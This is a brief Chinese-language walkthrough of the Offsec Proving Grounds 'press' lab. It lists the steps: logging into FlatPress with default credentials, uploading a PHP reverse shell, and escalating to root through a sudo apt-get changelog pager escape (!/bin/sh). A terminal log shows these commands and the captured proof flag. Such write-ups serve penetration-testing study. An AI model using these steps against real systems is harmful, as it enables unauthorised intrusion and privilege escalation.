参考资料：https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/press.md  
press
 
高手的总结  
完成本实验后，学习者将能够：  
枚举服务并识别目标服务器上运行的 FlatPress。  
使用默认凭据（admin:password）登录 FlatPress 并访问上传功能。  
上传一个包含反向 shell 有效载荷的恶意 PHP 文件。  
通过媒体管理器触发上传的文件，以建立反向 shell 作为 www-data。  
利用 /usr/bin/apt-get 的 sudo 权限提升权限并获得 root 访问权限。
   

apt (1.4.3) unstable; urgen  
$ python3 -c'import pty;pty.spawn("/bin/bash")'  
www-data@debian:/$ ls  
ls  
bin home lib32 media root sys vmlinuz  
boot initrd.img lib64 mnt run tmp vmlinuz.old  
dev initrd.img.old libx32 opt sbin usr  
etc lib lost+found proc srv var  
www-data@debian:/$ sudo apt-get changelog apt  
sudo apt-get changelog apt  
Get:1 store: apt 2.2.4 Changelog  
Fetched 487 kB in 0s (0 B/s)  
WARNING: terminal is not fully functional  
/tmp/apt-changelog-8JqJLL/apt.changelog (press RETURN)!/bin/sh  
!//bbiinn//sshh!/bin/sh  
# cd /root  
cd /root  
# ls  
ls  
email8.txt proof.txt  
# cat proof.txt  
cat proof.txt  
b7bb656c4246d658d183f9d3fe85999b  
#
      

[https://github.com/flatpressblog/flatpress/issues/152](https://github.com/flatpressblog/flatpress/issues/152)  
参考资料： sudo 提权  
[https://gtfobins.github.io/gtfobins/apt-get/?source=post_page-----284c624ba447](https://gtfobins.github.io/gtfobins/apt-get/?source=post_page-----284c624ba447)---------------------------------------